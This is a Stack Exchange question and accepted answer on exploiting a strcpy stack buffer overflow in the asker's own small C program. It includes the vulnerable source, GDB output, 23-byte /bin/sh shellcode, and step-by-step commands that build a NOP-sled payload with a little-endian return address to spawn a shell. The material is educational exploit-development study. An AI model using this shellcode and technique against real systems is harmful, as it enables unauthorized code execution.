{
    "title": "Strcpy BufferOverflow get shellcode location for EIP",
    "link": "https://reverseengineering.stackexchange.com/questions/11042/strcpy-bufferoverflow-get-shellcode-location-for-eip",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I am trying to get a shellcode, exploiting a C program with a <code>strcpy()</code> function.</p>\n<p>I have found out that I need 68 bytes to start writing on the <code>EIP</code>. So, if I write 72's by <code>EIP</code> register is <code>0x41414141</code>.</p>\n<p>What I want is to insert a 23 bytes shellcode for a x86 OS. So I know that I need this:</p>\n<ul>\n<li>68 A bytes - 23 shellcode bytes:  45 <code>NOPs</code>. </li>\n<li>23 bytes Shellcode.</li>\n<li>4 bytes for the <code>EIP</code> register, pointing the start of the shellcode.</li>\n</ul>\n<p>I don't know how to carry this out. This is my program:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid cambiarEIP() {\n    printf(\"\\n Has cambiado el valor del EIP, enhorabuena\\n\");\n}\n\nint main(int argc, char * argv[]) {\n    char buf[64];\n\n    if(argc == 1) {\n        printf(\"Uso: %s entrada\\n\", argv[0]);\n        return -1;\n    }\n\n    strcpy(buf,argv[1]);\n    printf(\"%s\\n\", buf);\n\n    return 0;\n}\n</code></pre>\n<p>I want to insert this as a parameter: <code>45As+shellcode+EIP</code> DIR.</p>\n<p>This is what I get with the GDB when passing 71 bytes as a parameter:</p>\n<pre><code> Program received signal SIGSEGV, Segmentation fault.\n 0x00414141 in ?? ()\n</code></pre>\n<p>And those are my registers:</p>\n<pre><code>(gdb) i r\neax            0x0  0\necx            0xb7fbc4e0   -1208236832\nedx            0xb7fbd360   -1208233120\nebx            0xb7fbbff4   -1208238092\nesp            0xbffff4a0   0xbffff4a0\nebp            0x41414141   0x41414141\nesi            0x0  0\nedi            0x0  0\neip            0x414141 0x414141\neflags         0x10246  [ PF ZF IF RF ]\ncs             0x73 115\nss             0x7b 123\nds             0x7b 123\nes             0x7b 123\nfs             0x0  0\ngs             0x33 51\n</code></pre>\n<p>I know that I need something like this:</p>\n<pre><code>./shell \\x41\\*45 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"\n          \"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + Shellcode location\n</code></pre>\n<p>How to carry this out?</p>\n</div>",
    "votes": "0",
    "answers": 1,
    "views": "4k",
    "tags": [
        "assembly",
        "gdb",
        "shellcode",
        "register"
    ],
    "user": "aDoN",
    "time": "Oct 12, 2015 at 12:34",
    "comments": [],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<blockquote>\n<p>68 A bytes - 23 shellcode bytes: 45 NOPs.</p>\n</blockquote>\n<p>NOP is the mnemonic that stands for No OPeration which is the byte \\x90, meaning that you'll have to change the A's (\\x41) for NOPs (\\x90), because \\x41 by itself it's not a valid ASM instruction in the x86 processor hence making your program crash.</p>\n<p>Taking this into account, first part goes like:</p>\n<pre><code>python -c 'print \"\\x90\"*45' &gt; payload.bin\n</code></pre>\n<blockquote>\n<p>23 bytes Shellcode</p>\n</blockquote>\n<p>This is self explanatory, just add your shellcode:</p>\n<pre><code>python -c 'print \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"' &gt;&gt; payload.bin\n</code></pre>\n<blockquote>\n<p>4 bytes for the EIP register, pointing the start of the shellcode.</p>\n</blockquote>\n<h1>Here's the tricky part:</h1>\n<p>First ask yourself a few questions:</p>\n<ol>\n<li>Does the system have ASLR enabled?</li>\n<li>Does it have DEP enabled?</li>\n<li>NX?</li>\n</ol>\n<p><a href=\"https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx\">Read this if the answer is that you don't know</a></p>\n<p>And if the answer to both of these is <strong>no</strong> then, continue to check into gdb the following</p>\n<ol>\n<li><a href=\"https://stackoverflow.com/questions/10483544/stopping-at-the-first-machine-code-instruction-in-gdb\">Set a breakpoint at program's entry point in gdb</a></li>\n<li>Step in gdb until you get to the call to strcpy (id est, when the overflow happens)</li>\n<li>Get the location of your <em>buf</em> variable in stack. We can do so by writing the next command in gdb since the Stack Pointer is pointing right at the beginning of <em>buf</em>\n<ul>\n<li><code>x/32xb $esp</code></li>\n</ul>\n</li>\n</ol>\n<p>Now that you have the location of your <em>buf</em> variable, which should be something in the form <code>0xbffff5f0</code>. Now get that memory position and add it to the end of your payload. You need this position in order to jump to the location of your <em>buf</em> variable and execute the shellcode in it...</p>\n<h1>But hold on!</h1>\n<p>You still have to take <a href=\"https://en.wikipedia.org/wiki/Endianness\" rel=\"nofollow noreferrer\">endianness</a> into account, which in your system is little endian.</p>\n<p>So you'll need to write that memory position in little endian which, if you are lazy like me, you'll end up <a href=\"https://github.com/n30m1nd/pyndianizer\" rel=\"nofollow noreferrer\">writing a script that makes it for you</a>:</p>\n<p><code>python pyndianizer.py 0xbffff5f0</code> ==&gt; <code>\\xf0\\xf5\\xff\\xbf</code></p>\n<p>Now, add it to your payload\n<code>python -c 'print \"\\xf0\\xf5\\xff\\xbf\"' &gt;&gt; payload.bin</code></p>\n<h1>And for the grand finale:</h1>\n<p><code>cat payload.bin | ./shell</code></p>\n<p>If everything was done well, just press a few enters and you'll have your shell.</p>\n<h1>Final note</h1>\n<p><em>Your shellcode runs <code>/bin/sh</code> but just running it doesn't work sometimes because the program ends just after running your shellcode. If so, you'll have to make it wait for user input after <code>cat</code>ing the shellcode in</em></p>\n</div>",
            "votes": "5",
            "user": "Community",
            "time": "Jun 17, 2020 at 9:54",
            "is_accepted": true,
            "comments": []
        }
    ]
}